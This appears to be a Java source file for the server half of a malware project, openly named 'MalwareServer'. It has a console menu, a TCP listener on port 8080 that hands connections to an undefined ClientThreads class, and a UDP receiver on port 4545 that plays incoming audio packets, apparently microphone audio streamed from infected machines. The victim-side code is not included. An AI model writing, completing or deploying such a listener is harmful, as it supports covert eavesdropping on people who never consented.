import java.io.ByteArrayInputStream;
import java.net.DatagramPacket;
import java.net.DatagramSocket;
import java.net.ServerSocket;
import java.net.Socket;
import java.util.Scanner;
import java.io.IOException;
import java.io.PrintStream;
import java.io.DataInputStream;

import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioInputStream;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.FloatControl;
import javax.sound.sampled.SourceDataLine;

class MalwareServer
{

	AudioInputStream audioInputStream;
	static AudioInputStream ais;
	static AudioFormat format;
	static boolean status = true;
	static int port = 4545;
	static int socketPort = 8080;
	static int sampleRate = 44100;

	static DataLine.Info dataLineInfo;
	static SourceDataLine sourceDataLine;

	static String choice = "";
	static ServerSocket sSocket = null;

	public static void main(String args[]) throws Exception
	{
		System.out.println("---------------");
		System.out.println("Malware Server");
		System.out.println("---------------");
		System.out.println();
		System.out.println("<1> Application Control \n" +
							"<2> Server Control \n");
		Scanner in = new Scanner(System.in);
		System.out.print("-> ");
		choice = in.nextLine();
		System.out.println();


		if(choice.equals("1"))
		{
			setup();
		}
		else
		{
			createConnection(socketPort);
		}
	}

	public static void createConnection(int sPort)
	{
			try
			{
				ServerSocket sSocket = new ServerSocket(sPort);
				Socket conn = null;
				System.out.println("Server created. Waiting for connection...");

				while(true)
				{
					conn = sSocket.accept();

					System.out.println("Connection received from " + conn.getInetAddress().getHostName() + " : " + conn.getPort());

					new ClientThreads(conn).start();
				}
			}
			catch(IOException e)
			{
				System.err.println("IOException");
			}


			try
			{
				sSocket.close();
			}
			catch(IOException ioException)
			{
				System.err.println("Unable to close. IOexception");
			}
	}

	public static void setup() throws Exception
	{
		System.out.println("Creating Connection");
		DatagramSocket serverSocket = new DatagramSocket(port);

		byte[] receiveData = new byte[3584];

		System.out.println("Configuring Audio");
		format = new AudioFormat(sampleRate, 16, 1, true, false);
		dataLineInfo = new DataLine.Info(SourceDataLine.class, format);
		sourceDataLine = (SourceDataLine) AudioSystem.getLine(dataLineInfo);
		sourceDataLine.open(format);
		sourceDataLine.start();

		FloatControl volumeControl = (FloatControl) sourceDataLine.getControl(FloatControl.Type.MASTER_GAIN);
		volumeControl.setValue(1.00f);

		System.out.println("Configuring Incoming Packet");
		DatagramPacket receivePacket = new DatagramPacket(receiveData, receiveData.length);
		ByteArrayInputStream baiss = new ByteArrayInputStream(receivePacket.getData());

		System.out.println("Ready To Stream...");
		while (status == true)
		{
			serverSocket.receive(receivePacket);
			ais = new AudioInputStream(baiss, format, receivePacket.getLength());
			playBack(receivePacket.getData());
		}
		sourceDataLine.drain();
		sourceDataLine.close();
	}

	public static void playBack(byte soundbytes[])
	{
		try
		{
			sourceDataLine.write(soundbytes, 0, soundbytes.length);
		}
		catch (Exception e)
		{
			System.out.println("No output to speakers");
			e.printStackTrace();
		}
	}
}
